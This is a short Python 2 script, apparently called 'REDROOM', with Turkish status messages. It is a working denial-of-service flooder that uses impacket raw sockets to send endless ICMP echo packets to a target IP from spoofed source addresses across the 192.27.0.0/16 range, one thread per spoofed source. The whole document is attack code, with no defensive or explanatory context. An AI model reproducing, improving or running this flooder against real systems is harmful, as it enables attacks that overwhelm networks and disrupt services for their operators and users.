import socket
import struct
import sys
import time
import thread
from impacket import ImpactDecoder, ImpactPacket
print(".::REDROOM::.")
if len(sys.argv) == 2:
    target_ip = sys.argv[1]
else:
    print "Usage: %s ziyaretci IP hedef IP \n eg: %s 192.168.1.0 192.24.31.1" %(sys.argv[0],sys.argv[0])
    exit(1)
print ("Saldiri basladi ...")
def Flood(src, dst):
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHO)
    icmp.contains(ImpactPacket.Data("A"*156))
    ip.contains(icmp)
    seq_id = 0
    while 1:
        seq_id += 1
        icmp.set_icmp_id(seq_id)
        s = socket.socket(socket.AF_INET,socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
        s.sendto(ip.get_packet(), (dst,0))
        print("Gonderildi %s sid %d") % (src,seq_id)
        continue
for j in range(256):
    src1 = "192.27." + str(j)
    for i in range(256):
        src = src1 + "." + str(i)
        thread.start_new_thread(Flood, (src, target_ip))
        time.sleep(0.2)